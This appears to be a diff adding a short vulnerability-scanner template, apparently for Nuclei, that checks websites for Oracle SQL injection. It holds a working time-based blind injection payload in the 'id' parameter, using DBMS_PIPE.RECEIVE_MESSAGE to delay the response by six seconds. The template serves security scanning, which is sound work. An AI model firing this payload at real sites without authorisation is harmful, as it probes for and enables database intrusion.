@@ -1,0 +1,12 @@
+id: K70n0s510-sqli-oracle
+info:
+  name: Oracle SQLi
+  author: K70n0s510
+  severity: critical
+  tags: sqli,oracle
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?id=1' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',6) FROM DUAL)=1--"]
+    matchers:
+      - type: dsl
+        dsl: ["duration>=6"]
